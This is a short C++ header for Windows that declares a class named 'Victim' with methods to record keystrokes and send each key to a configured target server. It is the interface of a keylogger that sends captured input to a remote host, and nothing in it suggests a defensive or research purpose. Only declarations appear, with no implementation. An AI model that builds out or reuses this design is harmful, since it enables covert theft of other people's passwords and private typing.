#pragma once
#include <iostream>
#include <Winsock2.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <string>

#define ACTIVE_PROMISE_CODE -32767

class Victim {
private:
	std::string _target_server;
	void sendKey(char key);

public:
	Victim(std::string target_server);
	void recordAndSendKeys();
};
